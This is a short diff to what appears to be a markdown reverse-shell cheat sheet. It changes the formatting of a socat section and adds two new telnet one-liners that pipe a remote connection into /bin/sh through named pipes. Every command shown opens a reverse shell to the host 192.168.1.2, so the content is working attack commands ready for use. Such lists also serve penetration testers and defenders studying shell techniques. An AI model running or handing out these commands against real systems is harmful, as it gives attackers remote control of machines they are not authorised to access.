@@ -483,9 +483,10 @@
   ---
   # <kbd>Socat</kbd>
    
-  ```bash
+  ```cmd
   socat TCP:192.168.1.2:443 EXEC:sh
-   
+  ```
+  ```cmd 
   socat TCP:192.168.1.2:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane 
   ```
    
@@ -538,7 +539,13 @@
   ```cmd
   telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
   ```
-  
+  ```cmd
+  mknod a p && telnet 192.168.1.2 443 0<a | /bin/sh 1>a
+  ``` 
+  ```cmd
+  TF=$(mktemp -u);mkfifo $TF && telnet 192.168.1.2 443 0<$TF | sh 1>$TF
+  ```
+   
   ---
   
   # <kbd>Java</kbd>
